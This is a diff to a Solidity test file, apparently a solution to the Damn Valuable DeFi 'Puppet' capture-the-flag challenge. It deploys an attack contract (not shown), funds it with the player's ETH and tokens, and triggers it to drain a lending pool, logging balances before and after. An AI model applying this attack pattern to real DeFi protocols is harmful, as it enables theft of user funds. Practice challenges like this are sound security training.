@@ -7,6 +7,7 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
 import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
 import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
+import {Attack} from "../../src/puppet/Attack.sol";
 
 contract PuppetChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -92,7 +93,19 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        console.log("player balance: ", player.balance / 1e18);
+        console.log("player token balance: ", token.balanceOf(player) / 1e18);
+        console.log("pool token balance: ", token.balanceOf(address(lendingPool)) / 1e18);
+
+        Attack attack = new Attack(address(token), address(lendingPool), address(uniswapV1Exchange), recovery);
+        (bool success,) = address(attack).call{value: player.balance}("");
+        require(success, "call failed");
+        token.transfer(address(attack), token.balanceOf(player));
+        attack.attack();
+
+        console.log("player balance: ", player.balance / 1e18);
+        console.log("player token balance: ", token.balanceOf(player) / 1e18);
+        console.log("pool token balance: ", token.balanceOf(address(lendingPool)) / 1e18);
     }
 
     // Utility function to calculate Uniswap prices
